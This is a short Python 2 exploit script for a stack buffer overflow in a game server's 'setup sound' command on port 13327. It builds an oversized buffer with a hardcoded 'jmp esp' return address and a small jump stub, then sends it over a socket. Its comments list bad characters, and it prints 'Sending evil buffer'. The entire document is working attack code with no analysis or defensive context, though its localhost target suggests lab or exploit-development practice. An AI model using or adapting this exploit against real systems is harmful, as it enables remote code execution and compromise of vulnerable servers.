#!/usr/bin/python
import socket

host="127.0.0.1" 

# \x00 \x20 are the bad chars

#08134597: jmp esp

crash= "\x41" * 4368 + "\x97\x45\x13\x08" + "\x83\xC0\x0C\xFF\xE0" + "\x90\x90"

buffer = "\x11(setup sound " + crash + "\x90\x00#"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*]Payload Sent!"
